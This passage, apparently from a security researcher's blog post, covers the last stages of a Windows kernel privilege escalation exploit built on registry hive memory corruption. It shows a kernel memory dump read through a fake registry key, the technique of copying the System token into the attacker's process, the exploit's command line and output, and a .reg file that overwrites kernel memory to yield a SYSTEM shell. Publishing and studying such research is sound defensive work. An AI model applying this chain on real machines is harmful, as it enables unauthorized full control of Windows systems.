class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;0e&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;........&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;fffff803`50800044&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;00&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;b4&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;09&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;b8&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;01&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;4c&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;....!..L&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;fffff803`5080004c&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;54&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;68&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;69&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;73&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;70&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;.!This&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;p&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;fffff803`50800054&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;72&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;6f&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;67&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;72&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;61&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;6d&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;63&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;rogram&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;c&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;fffff803`5080005c&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;61&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;6e&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;6e&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;6f&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;74&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;62&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;65&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;annot&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;be&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;p class=&quot;ormwWEjHLs-c3 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;And then let&amp;#39;s browse to the same address using our FakeKey in Regedit:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c8&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgv1a-6K0ie1_G_c48gw4dm24EkykTZv0Ne-URtCk6WGzF5Au1Hxu7fc9aZ49RBqajwAGisBbunyBUA8TAN0ejSDUkEzBEYkkujQnWQXsfSxsJhhfrgHGx_BLRsRNR0EX2aT1ZrkU8QXCY7Udlwwu49K7gKze1TyLj69ig25OkSTYg1tuLDDOZRWkU04R8/s834/image4.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgv1a-6K0ie1_G_c48gw4dm24EkykTZv0Ne-URtCk6WGzF5Au1Hxu7fc9aZ49RBqajwAGisBbunyBUA8TAN0ejSDUkEzBEYkkujQnWQXsfSxsJhhfrgHGx_BLRsRNR0EX2aT1ZrkU8QXCY7Udlwwu49K7gKze1TyLj69ig25OkSTYg1tuLDDOZRWkU04R8/s834/image4.png&quot; border=&quot;0&quot; alt=&quot;Fake key in registry editor&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;Fake key in registry editor&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;The data from both sources match, and the KernelData value displays them correctly without any additional offset. A keen observer will note that the expected &amp;quot;MZ&amp;quot; signature is not there, because I entered an address 4 bytes greater than the kernel image base. I did this because, even though we can &amp;quot;peek&amp;quot; at any virtual address X through the special registry value, the kernel still internally accesses address X-4 for certain implementation reasons. Since there isn&amp;#39;t any data mapped directly before the ntoskrnl.exe image in memory, using the exact image base would result in a system crash while trying to read from the invalid address 0xFFFFF803507FFFFC.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;An even more attentive reader will also notice that the exploit has jokingly changed the window title from &amp;quot;Registry Editor&amp;quot; to &amp;quot;Kernel Memory Editor&amp;quot;, as that&amp;#39;s what the program has effectively become at this point. &amp;#128578;&lt;/span&gt;&lt;/p&gt;&lt;h3 class=&quot;ormwWEjHLs-c24&quot; id=&quot;h.zcikr95v31gg&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c35 ormwWEjHLs-c14&quot;&gt;Step 4: Elevating process security token&lt;/span&gt;&lt;/h3&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;With an &lt;/span&gt;&lt;span&gt;arbitrary kernel read/write primitive and the address of ntoskrnl.exe at our disposal, escalating privileges is a formality.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;The simplest approach is perhaps to iterate through the linked list of all processes (made of _EPROCESS structures) starting from nt!KiProcessListHead, find both the &amp;quot;System&amp;quot; process and our own process on the list, and then copy the security token from the former to the latter.&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;This method is illustrated in the diagram below.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjs1u-IujR3tah8nQ0OBRZASc6NkVv5-p3sbSbtxQqVbnli0KO1gDYNrRb6htG5ruVug7xp2vn3cicPzTR2WcziSrjpgBImVpuEofR0v6GNa6yy0iXbEtTkcBaJnjkaya7TsjnfzveN-4IvJyt2Bq8QHxlQ6Nd_BEaUG5Py9Y-RKjDoNnoMdjQOQ5mPzKw/s1679/image15.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjs1u-IujR3tah8nQ0OBRZASc6NkVv5-p3sbSbtxQqVbnli0KO1gDYNrRb6htG5ruVug7xp2vn3cicPzTR2WcziSrjpgBImVpuEofR0v6GNa6yy0iXbEtTkcBaJnjkaya7TsjnfzveN-4IvJyt2Bq8QHxlQ6Nd_BEaUG5Py9Y-RKjDoNnoMdjQOQ5mPzKw/s1200/image15.png&quot; border=&quot;0&quot; alt=&quot;Diagram described above&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;Diagram described above&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;This entire procedure could be easily performed programmatically, using only &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c13&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regqueryvalueexw&quot;&gt;RegQueryValueEx&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c13&quot;&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regsetvalueexa&quot;&gt;RegSetValueEx&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&amp;nbsp;calls. However, it would be a shame not to take advantage of the fact that we can modify kernel memory through built-in Windows tools. Therefore, my exploit performs most of the necessary steps automatically, except for the final stage &amp;ndash; overwriting the process security token. For that part, it creates a .reg file on disk that refers to our fake key and its two registry values. The first is KernelAddr, which points to the address of the security token within the _EPROCESS structure of a newly created command prompt, followed by KernelData, which contains the actual value of the System token. The invocation and output of the exploit looks as follows:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;table class=&quot;ormwWEjHLs-c19&quot;&gt;&lt;tr class=&quot;ormwWEjHLs-c12&quot;&gt;&lt;td class=&quot;ormwWEjHLs-c11&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;C:\Users\user\Desktop\exploits&amp;gt;Exploit.exe&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;C:\users\user\Desktop\become_admin.reg&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;[+]&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Found&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;kernel&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;base&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;address:&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;fffff80350800000&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;[+]&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Spawning&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;prompt...&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;[+]&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Found&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;6892&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;at&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;address&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;ffff8107b3864080&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;[+]&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;process:&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;ffff8107ad0ed040,&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;security&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;token:&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;ffffc608b4c8a943&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;[+]&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;Exploit&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;succeeded,&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;enjoy!&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c0&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c3&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c0 ormwWEjHLs-c2&quot;&gt;C:\Users\user\Desktop\exploits&amp;gt;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;p class=&quot;ormwWEjHLs-c3 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;Then, a new command prompt window appears on the screen. There, we can manually perform the final step of the attack, applying changes from the newly created become_admin.reg file using the reg.exe tool, thus overwriting the appropriate field in kernel memory and granting ourselves elevated privileges:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c8&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjtyLi4MTbnd2g3n9Ipe9dLi63n6AnmnlomWxH2W86vHi2dJhYaS2TDNyo92XOaSZxI1r0kSV8Ibd1uqeMZWRL6ERBNGEXi5tuc7_q0RqAj9Gb7z35xUGAee_H8OqEJi2i0I4k43k0hFi75cV1QzZE4IBeTru-uEIu5S_k7-vSsKOKwgtyTLWl2u4S7V8U/s666/image10.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjtyLi4MTbnd2g3n9Ipe9dLi63n6AnmnlomWxH2W86vHi2dJhYaS2TDNyo92XOaSZxI1r0kSV8Ibd1uqeMZWRL6ERBNGEXi5tuc7_q0RqAj9Gb7z35xUGAee_H8OqEJi2i0I4k43k0hFi75cV1QzZE4IBeTru-uEIu5S_k7-vSsKOKwgtyTLWl2u4S7V8U/s666/image10.png&quot; border=&quot;0&quot; alt=&quot;It works!&quot; style=&quot;max-height: 750px; max-width: 600px;&quot;title=&quot;It works!&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;As we can see, the attack was indeed successful, and our cmd.exe process is now running as NT&amp;nbsp;AUTHORITY\SYSTEM. A similar effect could be achieved from the graphical interface by double-clicking the .reg file and applying it using the Regedit program associated with this extension. This is exactly how I finalized my attack during the exploit demonstration at OffensiveCon 2024, which can be viewed in the recording of the presentation:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c9 ormwWEjHLs-c6&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;center&gt;&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/qllMa2UUPvY?si=6b5D7TqcZLu8d97g&amp;amp;start=2575&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen&gt;&lt;/iframe&gt;&lt;/center&gt;
 &lt;h2 class=&quot;ormwWEjHLs-c31&quot; id=&quot;h.i0j9qex4avle&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c38&quot;&gt;Final thoughts&lt;/span&gt;&lt;/h2&gt;
 &lt;p class=&quot;ormwWEjHLs-c9&quot;&gt;&lt;span&gt;Since we have now fully achieved our intended goal, we can return to our earlier, incomplete diagram, and fill it in with all the intermediate steps we have taken&lt;/span&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;ormwWEjHLs-c8&quot;&gt;&lt;span class=&quot;ormwWEjHLs-c1 ormwWEjHLs-c7&quot;&gt;&lt;a href=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi1T4iWbI3QqKpp3v4xQ0XLVVSlF2WH4Mmj2voQyvCTsMnLQ6eTD5ISY6XlMzPn9wkKl6FKrUuiuNQCCRsPV3MQAi0pE2AeKoRUOGg59UDH1JIsfPPgzsFucbRqyNpEcclQIkSVc0cgKVEOvRR7c0IMeh-Gyrm7S5eQ8rA8gasXRUoM2cs-6fKLmkt9siY/s1731/image12.png&quot; style=&quot;display: block; padding: 1em 0;text-align: center;&quot;&gt;&lt;img src=&quot;https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi1T4iWbI3QqKpp3v4xQ0XLVVSlF2WH4Mmj2voQyvCTsMnLQ6eTD5ISY6XlMzPn9wkKl6FKrUuiuNQCCRsPV3MQAi0pE2AeKoRUOGg59UDH1JIsfPPgzsFucbRqyNpEcclQIkSVc0cgKVEOvRR7c0IMeh-Gyrm7S5eQ8rA8gasXRUoM2cs-6fKLmkt9siY/s666/image12.png&quot; border=&quot;0&quot; alt=&quot;A flowchart illustrating a multi-step attack chain leading to privilege escalation. The process begins with &amp;ldquo;Hive memory corruption&amp;rdquo;, which leads to &amp;ldquo;Construction of a controlled registry value&amp;rdquo;. This enables &amp;ldquo;Disabling the cell index bounds check&amp;rdquo;, followed by a &amp;ldquo;Kernel image base leak&amp;rdquo;. The leak is then used for &amp;ldquo;Construction of self-referential values for arbitrary kernel r/w&amp;rdquo; (read/write), ultimately resulting in &amp;ldquo;Privilege escalation by stealing the system token&amp;rdquo;.&quot; /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;
